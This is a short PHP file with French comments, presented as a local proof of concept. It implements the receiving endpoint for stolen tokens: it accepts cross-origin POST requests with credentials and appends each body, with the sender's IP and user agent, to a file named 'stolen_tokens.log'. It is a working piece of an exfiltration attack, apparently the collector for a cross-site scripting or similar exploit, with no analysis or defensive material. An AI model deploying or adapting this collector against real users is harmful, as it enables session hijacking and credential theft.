<?php
// collect.php — PoC local only
// Lancer avec: php -S 127.0.0.1:8000
// Le fichier 'stolen_tokens.log' contiendra une ligne JSON par requête.

// --- Configuration ---
$logFile = __DIR__ . '/stolen_tokens.log';
$allowedOrigin = 'http://localhost:8080'; // adapte si besoin

// --- CORS (simple) ---
if (isset($_SERVER['HTTP_ORIGIN'])) {
    // soit restreindre à $allowedOrigin, soit autoriser tous '*'
    if ($_SERVER['HTTP_ORIGIN'] === $allowedOrigin) {
        header('Access-Control-Allow-Origin: ' . $allowedOrigin);
        header('Access-Control-Allow-Credentials: true');
        header('Access-Control-Allow-Headers: Content-Type');
    }
}

// Supporter preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    // Permettre POST et Content-Type
    header('Access-Control-Allow-Methods: POST, OPTIONS');
    exit(0);
}

// Lire le body brut
$raw = file_get_contents('php://input');
$decoded = json_decode($raw, true);

// Construire l'entrée de log
$entry = [
    'time'       => gmdate('c'),
    'remote_ip'  => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'content'    => $decoded === null ? $raw : $decoded
];

// Écrire en "JSON lines" (une ligne JSON par entrée)
file_put_contents($logFile, json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND | LOCK_EX);

// Réponse simple
header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
